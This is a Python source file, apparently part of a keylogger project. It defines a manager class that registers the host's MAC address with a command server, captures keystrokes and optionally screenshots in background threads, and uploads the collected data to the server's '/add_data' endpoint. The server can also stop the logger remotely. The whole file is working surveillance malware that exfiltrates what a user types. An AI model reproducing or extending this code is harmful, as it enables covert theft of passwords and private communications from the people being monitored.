import urllib.parse

import pygetwindow
import requests
from getmac import get_mac_address

from KEYLOGGER_PROJECT.Encrypt_Decrypt.encrypt_file import Encrypt
from Network_Writer import NetworkWrite
from Write_to_file import FileWriter
from KeyLogger_Service import KeyloggerService

import os
import threading
import time
import keyboard




class KeyLoggerManager:
    def __init__(self, server_link, if_screenshot=True, file_write=False, network_write=True):
        self.server_link = server_link
        self.__if_screenshot = if_screenshot
        self.file_write = file_write
        self.network_write = network_write
        self.__instance = KeyloggerService(if_screenshot)

        res_status = 0
        while res_status != 200:
            try:
                res = requests.post(server_link + '/send_mac', data=get_mac_address())
                res_status = res.status_code
            except:
                pass
            time.sleep(3)



    def start(self):
        self.__instance._start()

    def __thread_take_shot(self):
        while self.__instance.action:
            try:
                self.__instance._take_shot()
            except Exception as e:
                self.__instance._KeyloggerService__add_to_data(self.__instance.data, ('error in:',pygetwindow.getActiveWindowTitle(),'exception:',e))
            time.sleep(0.5)

    def __write_file(self):
        time.sleep(0.1)
        file_writer = FileWriter()
        while self.__instance.action:
            if self.__instance._KeyloggerService__data:
                try:
                    file_writer.write_to_file(self.__instance.data)
                except Exception as e:
                    self.__instance._KeyloggerService__add_to_data(self.__instance.data, e)
            time.sleep(8)
        file_writer.write_to_file(self.__instance.data)
        net_writer = NetworkWrite(self.server_link+'/add_data')
        with open(file_writer.file_path, 'r') as f:
            net_writer.write_to_server(f.read())
        # os.remove(r"C:\Users\Public\tmp.json")

    def write_server(self):
        writer = NetworkWrite(self.server_link+'/add_data')
        while self.__instance.action:
            if self.__instance._KeyloggerService__data:
                print('server write')
                data = self.__instance.data
                writer.write_to_server(data)
            time.sleep(5)

        data = self.__instance.data
        if data:
            writer.write_to_server(data)


    def check_status(self):
        mac = get_mac_address()
        while self.__instance.action:
            try:
                params = urllib.parse.urlencode({'mac': mac})
                res = requests.get(f'{self.server_link}/check_status?{params}')
                if res.status_code == 400:
                    self.__instance._KeyloggerService__change_action()
            except:
                pass
            time.sleep(3)


    def main(self):
        threading.Thread(target=self.start).start()
        if self.network_write:
            threading.Thread(target=self.write_server).start()
        if self.file_write:
            threading.Thread(target=self.__write_file).start()
        if self.__if_screenshot:
            threading.Thread(target=self.__thread_take_shot).start()
        threading.Thread(target=self.check_status).start()



server_link = "http://127.0.0.1:5000"
KeyLoggerManager(server_link, if_screenshot=False, file_write=False, network_write=True).main()